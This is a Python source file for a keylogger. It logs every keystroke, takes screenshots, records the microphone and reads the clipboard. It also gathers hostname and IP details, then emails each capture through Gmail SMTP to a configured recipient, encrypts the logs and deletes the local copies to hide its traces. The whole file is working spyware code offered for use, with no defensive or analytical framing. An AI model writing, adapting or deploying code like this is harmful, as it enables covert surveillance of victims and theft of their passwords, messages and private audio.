import os
import time
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from PIL import ImageGrab
from config import Config

class Keylogger:
    def __init__(self):
        # Initialize the configuration from the config file
        self.config = Config()
        
        # Define filenames for storing logs and other information
        self.keys_information = "key_log.txt"
        self.system_information = "systeminfo.txt"
        self.clipboard_information = "clipboard.txt"
        self.audio_information = "audio.wav"
        self.screenshot_information = "ss.png"
        
        # Initialize iteration count and timing information
        self.number_of_iterations = 0
        self.current_time = time.time()
        self.stopping_time = time.time() + self.config.time_iteration

    def send_email(self, filename, attachment, toaddr):
        try:
            fromaddr = self.config.email_address
            # Create a MIME multipart email
            msg = MIMEMultipart()
            msg['From'] = fromaddr
            msg['To'] = toaddr
            msg['Subject'] = "Log File"

            # Attach the email body
            body = "Body_of_the_mail"
            msg.attach(MIMEText(body, 'plain'))

            # Attach the file
            attachment = open(attachment, 'rb')
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {filename}")
            msg.attach(p)

            # Set up the SMTP server and send the email
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(fromaddr, self.config.password)
            text = msg.as_string()
            s.sendmail(fromaddr, toaddr, text)
            s.quit()
            print(f"Email sent successfully: {filename}")
        except Exception as e:
            print(f"Failed to send email: {filename}. Error: {e}")

    def computer_information(self):
        try:
            # Open the system information file to write data
            with open(self.config.file_merge + self.system_information, "a") as f:
                hostname = socket.gethostname()  # Get the hostname of the computer
                IPAddr = socket.gethostbyname(hostname)  # Get the private IP address
                
                # Attempt to get the public IP address
                try:
                    public_ip = get("https://api.ipify.org").text
                    f.write("Public IP Address: " + public_ip + '\n')
                except Exception:
                    f.write("Couldn't get Public IP Address (most likely max query)\n")
                
                # Write system information to the file
                f.write("Processor: " + platform.processor() + '\n')
                f.write("System: " + platform.system() + " " + platform.version() + '\n')
                f.write("Machine: " + platform.machine() + '\n')
                f.write("Hostname: " + hostname + '\n')
                f.write("Private IP Address: " + IPAddr + '\n')
            print("Computer information written successfully")
        except Exception as e:
            print(f"Failed to write computer information. Error: {e}")

    def copy_clipboard(self):
        try:
            # Open the clipboard information file to write data
            with open(self.config.file_merge + self.clipboard_information, "a") as f:
                try:
                    # Access the clipboard and get the copied data
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    f.write("Clipboard Data: \n" + pasted_data)
                except:
                    f.write("Clipboard could not be copied")
            print("Clipboard data copied successfully")
        except Exception as e:
            print(f"Failed to copy clipboard data. Error: {e}")

    def microphone(self):
        try:
            fs = 44100  # Sample rate for recording
            seconds = self.config.microphone_time  # Duration of recording

            # Record audio for the specified duration
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()  # Wait until the recording is finished

            # Save the recorded audio to a file
            write(self.config.file_merge + self.audio_information, fs, recording)
            print("Audio recorded successfully")
        except Exception as e:
            print(f"Failed to record audio. Error: {e}")

    def screenshot(self):
        try:
            print("Attempting to take a screenshot...")
            # Take a screenshot and save it to a file
            im = ImageGrab.grab()
            im.save(self.config.file_merge + self.screenshot_information)
            print("Screenshot taken and saved successfully")
        except Exception as e:
            print(f"Failed to take screenshot. Error: {e}")

    def on_press(self, key):
        # Handle key press events
        self.keys.append(key)  # Append the key to the list
        self.count += 1
        self.current_time = time.time()
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)  # Write the keys to the file
            self.keys = []

    def write_file(self, keys):
        try:
            # Open the key log file to write data
            with open(self.config.file_merge + self.keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")  # Clean up the key format
                    if k.find("space") > 0:
                        f.write('\n')  # Write a new line for space key
                    elif k.find("Key") == -1:
                        f.write(k)  # Write the key to the file
            print("Keys written to file successfully")
        except Exception as e:
            print(f"Failed to write keys to file. Error: {e}")

    def on_release(self, key):
        # Handle key release events
        if key == Key.esc:
            return False  # Stop the listener if the escape key is pressed
        if self.current_time > self.stopping_time:
            return False  # Stop the listener if the current time exceeds the stopping time

    def start_listener(self):
        self.keys = []  # Initialize the keys list
        self.count = 0  # Initialize the key count
        # Start the keyboard listener
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def run(self):
        while self.number_of_iterations < self.config.number_of_iterations_end:
            self.current_time = time.time()
            self.stopping_time = time.time() + self.config.time_iteration
            
            # Start the keyboard listener and perform other tasks
            self.start_listener()
            self.screenshot()
            self.microphone()
            self.copy_clipboard()
            self.number_of_iterations += 1
            
            # Send the collected data via email
            self.send_email(self.keys_information, self.config.file_merge + self.keys_information, self.config.toaddr)
            self.send_email(self.screenshot_information, self.config.file_merge + self.screenshot_information, self.config.toaddr)
            self.send_email(self.clipboard_information, self.config.file_merge + self.clipboard_information, self.config.toaddr)
            self.send_email(self.audio_information, self.config.file_merge + self.audio_information, self.config.toaddr)

        self.encrypt_files()  # Encrypt the collected files
        self.clean_up()  # Clean up by deleting the original files

    def encrypt_files(self):
        files_to_encrypt = [
            self.config.file_merge + self.system_information,
            self.config.file_merge + self.clipboard_information,
            self.config.file_merge + self.keys_information
        ]
        encrypted_file_names = [
            self.config.file_merge + self.system_information + ".enc",
            self.config.file_merge + self.clipboard_information + ".enc",
            self.config.file_merge + self.keys_information + ".enc"
        ]
        fernet = Fernet(self.config.encryption_key)
        for i in range(len(files_to_encrypt)):
            try:
                # Read the file data
                with open(files_to_encrypt[i], 'rb') as file:
                    data = file.read()
                
                # Encrypt the data
                encrypted = fernet.encrypt(data)
                
                # Write the encrypted data to a new file
                with open(encrypted_file_names[i], 'wb') as file:
                    file.write(encrypted)
                
                # Send the encrypted file via email
                self.send_email(encrypted_file_names[i], encrypted_file_names[i], self.config.toaddr)
                print(f"File encrypted and sent: {files_to_encrypt[i]}")
            except Exception as e:
                print(f"Failed to encrypt and send file: {files_to_encrypt[i]}. Error: {e}")

    def clean_up(self):
        delete_files = [
            self.system_information,
            self.clipboard_information,
            self.keys_information,
            self.screenshot_information,
            self.audio_information
        ]
        for file in delete_files:
            try:
                # Delete the file
                os.remove(self.config.file_merge + file)
                print(f"Deleted file: {file}")
            except Exception as e:
                logging.error(f"Failed to delete file: {file}. Error: {e}")
                print(f"Failed to delete file: {file}. Error: {e}")

if __name__ == "__main__":
    keylogger = Keylogger()  # Create an instance of the Keylogger class
    keylogger.run()  # Run the keylogger
